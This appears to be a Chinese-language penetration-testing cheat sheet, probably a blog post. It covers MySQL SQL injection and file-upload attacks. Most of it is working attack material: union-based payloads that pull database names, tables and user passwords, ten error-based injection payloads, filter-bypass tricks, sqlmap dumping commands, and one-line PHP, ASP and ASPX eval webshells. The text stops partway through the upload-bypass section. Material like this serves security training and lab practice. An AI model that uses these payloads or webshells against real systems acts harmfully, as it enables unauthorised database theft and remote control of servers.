<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找</span><br><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">SELECT * FROM 表名</span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">DELETE * FROM 表名称</span><br><span class="line"># 更新</span><br><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br><span class="line"># 增加</span><br><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line"></span><br><span class="line"># 字符截取</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select mid(database(),1,1)</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select substr(database(),1,1)</span><br><span class="line"></span><br><span class="line"># 左右字符</span><br><span class="line"># 返回当前数据库最左边的1个字符串</span><br><span class="line">select left(database(),1);</span><br><span class="line"># 返回当前数据库最右边的1个字符串</span><br><span class="line">select right(database(),1);</span><br><span class="line"></span><br><span class="line"># 字符ASCII</span><br><span class="line"># 结果为1或者0，也就是true or false</span><br><span class="line">select ascii(substr(database(),1,1))&gt;97;</span><br><span class="line">select ord(substr(database(),1,1))&gt;97;</span><br><span class="line"></span><br><span class="line"># 行数</span><br><span class="line"># 返回查询结果行数</span><br><span class="line">select count(username) from users;</span><br><span class="line"></span><br><span class="line">#合并</span><br><span class="line">select group_concat(a) from (select database() as a union select version() as a) as t;</span><br><span class="line"></span><br><span class="line"># 基础信息</span><br><span class="line"># 在sql语言中，and优先级大于or</span><br><span class="line">--+     注释符</span><br><span class="line">limit 0,1      从你表中的第一个数据开始，只读取一个</span><br><span class="line">order by      排序，判断字段数量，也就是表的列数</span><br><span class="line">union select  联合查询，连接前面语句，起着合并查询的作用</span><br><span class="line">group_concat  合并多行数据到一行</span><br><span class="line">version()    当前数据库版本</span><br><span class="line">database()   当前数据库</span><br><span class="line">@@datadir    数据库数据路径</span><br><span class="line">@@version_compile_os    操作系统版本</span><br></pre></td></tr></table></figure>
<h3 id="系统表">系统表</h3>
<p>在MySQL中，把information_schema看作是一个数据库，确切说是信息数据库。保存数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
<blockquote>
<ul>
<li>SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。<br>
show databases; 的结果取之此表。</li>
</ul>
<p>Schema.name列：所有数据库名</p>
<ul>
<li>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<br>
show tables from schemaname; (schemaname为指定数据库名)的结果取之此表。</li>
</ul>
<p>Table.name列：所有表名<br>
Table.schema列：来自哪个数据库</p>
<ul>
<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<br>
show columns from schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。</li>
</ul>
<p>Column_name列：所有列名<br>
Table.name列：来自哪个表<br>
Table.schema列：来自哪个数据库</p>
</blockquote>
<h3 id="判断是否有漏洞">判断是否有漏洞</h3>
<p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
<h3 id="类型">类型</h3>
<blockquote>
<p>按参数类型分类：<br>
数字型<br>
字符型<br>
搜索型<br>
按数据库返回结果分类：<br>
回显注入<br>
报错注入<br>
盲注<br>
基于布尔的盲注<br>
基于时间的盲注<br>
按注入点位置分类：<br>
GET注入<br>
POST注入<br>
Cookie注入<br>
Header注入<br>
… …</p>
</blockquote>
<h4 id="数字型">数字型</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.and逻辑测试：</span><br><span class="line"></span><br><span class="line">and 1=1  sql语句： select name from users where id=1 and 1=1</span><br><span class="line">and 1=2  sql语句： select name from users where id=1 and 1=2</span><br><span class="line"></span><br><span class="line">通过比较页面的变化判断输入是否被带入数据库执行。</span><br><span class="line"></span><br><span class="line">2.单引号测试：</span><br><span class="line"></span><br><span class="line">sql语句： select name from users where id=1&#x27;</span><br><span class="line"></span><br><span class="line">构造sql语法错误，来判断输入是否被执行。</span><br></pre></td></tr></table></figure>
<h4 id="字符型">字符型</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;、id=1&quot;  构造sql语法错误，来判断输入是否被执行。</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="搜索型">搜索型</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL=&quot;select * from users where name like &#x27;%tom%&#x27;&quot;</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;</span><br><span class="line">这个输入显然会报错误。</span><br><span class="line"></span><br><span class="line">1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1</span><br><span class="line">SQL查询语句：select * from users where name like &#x27;%1%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;</span><br><span class="line">这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。</span><br></pre></td></tr></table></figure>
<h4 id="GET显错注入">GET显错注入</h4>
<p>流程</p>
<blockquote>
<p>01、获取字段数    order by x<br>
02、获取显示位    union select 1,2,3,4……<br>
03、获取数据库信息        version()，user()，@@datadir<br>
04、获取当前数据库        database()， schema()<br>
05、获取所有数据库<br>
06、获取数据库表<br>
07、获取所有字段<br>
08、获取数据</p>
<ul>
<li>确定数字、字符、搜索型</li>
<li>注入点</li>
<li>当前数据库长度</li>
<li>遍历得当前数据库名称</li>
<li>获取数据库表总数</li>
<li>依次获取表的长度、名字</li>
<li>获取列</li>
<li>获取数据</li>
</ul>
</blockquote>
<p>注入步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断：</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=-1&#x27; or 1=1 --+</span><br><span class="line"></span><br><span class="line"># order by语句判断字段数量：</span><br><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line"></span><br><span class="line"># 联合查询获取显示位：</span><br><span class="line">id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库：</span><br><span class="line">id=-1&#x27; union select 1,(select database()),3 --+</span><br><span class="line"></span><br><span class="line"># 获取所有数据库：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库表名：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取users表所有字段：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段内容：</span><br><span class="line">id=-1&#x27; union select 1,username,password from users --+</span><br></pre></td></tr></table></figure>
<h4 id="报错注入">报错注入</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
<h3 id="绕过">绕过</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符可替换空格 /**/ # --</span><br><span class="line"></span><br><span class="line">内联注入</span><br><span class="line">/*!/*!*/</span><br><span class="line">/* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="工具使用">工具使用</h3>
<ul>
<li>sqlmap</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入sqlmap目录</span><br><span class="line"></span><br><span class="line"># 检测漏洞</span><br><span class="line">python sqlmap.py [url]</span><br><span class="line">python sqlmap.py -u http://mingy.lab/Less-1/?id=1</span><br><span class="line"></span><br><span class="line"># 获取当前用户</span><br><span class="line">python sqlmap.py -u [url] --current-user</span><br><span class="line"># 当前数据库</span><br><span class="line">python sqlmap.py -u [url] --current-db</span><br><span class="line"># 所有数据库名</span><br><span class="line">python sqlmap.py -u [url] --dbs</span><br><span class="line"># 数据库表名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] --tables</span><br><span class="line"># 列名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] --columns</span><br><span class="line"># 字段值</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] -C [列名1],[列名2] --dump</span><br><span class="line"></span><br><span class="line"># post注入</span><br><span class="line">python sqlmap.py -r aa.txt</span><br><span class="line">python sqlmap.py -r aa.txt --current-db --tables</span><br><span class="line"></span><br><span class="line"># aa.txt内容示例如下：</span><br><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=123456</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">#请求方法（如 POST）|目标路径（如 /login.php）|Host 头和其他必要头部（如 Content-Type）|空一行后接 POST 数据（如 username=...&amp;password=...）</span><br></pre></td></tr></table></figure>
<h2 id="文件上传">文件上传</h2>
<h3 id="常见一句话木马">常见一句话木马</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php一句话木马： </span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">asp一句话木马： </span><br><span class="line">&lt;%eval request(&quot;value&quot;)%&gt;</span><br><span class="line">aspx一句话木马： </span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="绕过-2">绕过</h3>
<ul>
<li>绕过客户端检测/JS检测</li>
</ul>
<p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p>
<p>方法：在本地浏览器客户端禁用]S即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现，利用burpsuite可以绕过一切客户端检测。</p>
<ul>
<li>绕过服务端检测</li>
</ul>
]]></content>
  </entry>
</search>
